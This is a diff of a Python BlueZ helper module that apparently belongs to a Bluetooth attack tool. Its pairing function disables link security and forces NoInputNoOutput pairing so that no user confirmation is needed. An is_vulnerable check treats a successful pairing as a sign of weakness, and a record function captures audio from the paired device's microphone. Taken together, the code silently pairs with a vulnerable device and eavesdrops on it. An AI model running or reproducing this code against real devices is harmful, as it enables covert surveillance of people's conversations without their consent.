@@ -1,9 +1,7 @@
 from enum import Enum
 import re
 import shlex
-from enum import Enum
 from system import run_and_check, CommandValidationException
-
 
 class BluezAddressType(Enum):
     BR_EDR = 0
@@ -12,17 +10,6 @@ class BluezAddressType(Enum):
 
     def __str__(self):
         return self.name
-
-
-def is_valid_bluezaddress(address: str) -> bool:
-    ok = True
-    try:
-        Address(address)
-    except ValueError:
-        ok = False
-
-    return ok
-
 
 class Address:
     regexp = re.compile(r"(?i:^([\da-f]{2}:){5}[\da-f]{2}$)")
@@ -38,23 +25,16 @@ class Address:
     def __eq__(self, other):
         return self._address == str(other).lower()
 
-
 class BluezTarget:
     regexp = re.compile(r"(?i:^([\da-f]{2}:){5}[\da-f]{2}$)")
 
-    def __init__(
-        self, address: str, type: int | BluezAddressType = BluezAddressType.BR_EDR
-    ):
+    def __init__(self, address: str, type: int | BluezAddressType = BluezAddressType.BR_EDR):
         self.address = Address(address)
         if isinstance(type, int):
             type = BluezAddressType(type)
         elif isinstance(type, str):
             type = BluezAddressType(int(type))
         self.type = type
-
-    def __eq__(self, other):
-        return self.address == other.address and self.type == other.type
-
 
 class BluezIoCaps(Enum):
     DisplayOnly = 0
@@ -63,57 +43,66 @@ class BluezIoCaps(Enum):
     NoInputNoOutput = 3
     KeyboardDisplay = 4
 
-
-def pair(target: BluezTarget, verbose: bool = False) -> bool:
-    # Configure ourselves to be bondable and pairable
+# ------------------------ Pairing / Connecting ------------------------
+def pair_device(target: BluezTarget, verbose: bool = False) -> bool:
+    from time import sleep
+    # Configure bondable / pairable
     run_and_check(shlex.split("sudo btmgmt bondable true"), verbose=verbose)
     run_and_check(shlex.split("sudo btmgmt pairable true"), verbose=verbose)
-
-    # No need for link security ;)
     run_and_check(shlex.split("sudo btmgmt linksec false"), verbose=verbose)
 
-    # Try to pair to a device with NoInputNoOutput capabilities
-    # TODO: Sometimes this may fail due to agent requesting user confirmation.
-    # Registering the following agent may help: "yes | bt-agent -c NoInputNoOutput"
     try:
         run_and_check(
             shlex.split(
-                f"sudo btmgmt pair -c {str(BluezIoCaps.NoInputNoOutput.value)} -t {str(target.type.value)} {str(target.address)}"
+                f"sudo btmgmt pair -c {BluezIoCaps.NoInputNoOutput.value} -t {target.type.value} {target.address}"
             ),
             is_valid=lambda out: not ("failed" in out and not "Already Paired" in out),
             verbose=verbose,
         )
+        sleep(1)
         return True
     except CommandValidationException as e:
         if "status 0x05 (Authentication Failed)" in e.output:
             return False
         raise e
 
+def connect_device(target: BluezTarget, timeout: int = 2, verbose: bool = False) -> bool:
+    try:
+        run_and_check(
+            shlex.split(f"bluetoothctl --timeout {timeout} scan on"), verbose=verbose
+        )
+        run_and_check(
+            shlex.split(f"bluetoothctl connect {target.address}"),
+            is_valid=lambda out: not "Failed to connect" in out,
+            verbose=verbose,
+        )
+        return True
+    except CommandValidationException:
+        return False
 
-def connect(target: BluezTarget, timeout: int = 2, verbose: bool = False):
-    run_and_check(
-        shlex.split(f"bluetoothctl --timeout {str(timeout)} scan on"), verbose=verbose
-    )
-    run_and_check(
-        shlex.split(f"bluetoothctl connect {str(target.address)}"),
-        is_valid=lambda out: not "Failed to connect" in out,
-        verbose=verbose
-    )
+# ------------------------ Vulnerability ------------------------
+def is_vulnerable(target: BluezTarget, verbose: bool = False) -> bool:
+    """
+    Check if the device is vulnerable by attempting pairing with NoInputNoOutput
+    Returns True if pairing succeeds (vulnerable), False otherwise
+    """
+    try:
+        return pair_device(target, verbose=verbose)
+    except Exception:
+        return False
 
-
+# ------------------------ Recording / Playback ------------------------
 def normalize_address(target: BluezTarget) -> str:
     return str(target.address).upper().replace(":", "_")
-
 
 def to_card_name(target: BluezTarget) -> str:
     return "bluez_card." + normalize_address(target=target)
 
-
 def to_source_name(target: BluezTarget) -> str:
-    return "bluez_input." + normalize_address(target=target) + ".0"
-
+    return "bluez_input." + normalize_address(target) + ".0"
 
 def record(target: BluezTarget, outfile: str, verbose: bool = True):
+    import subprocess
     source_name = to_source_name(target)
     card_name = to_card_name(target)
     run_and_check(
@@ -126,7 +115,6 @@ def record(target: BluezTarget, outfile: str, verbose: bool = True):
         pass
     except:
         raise
-
 
 def playback(sink: str, file: str, verbose: bool = True):
     run_and_check(["paplay", "-d", sink, file], verbose=verbose)
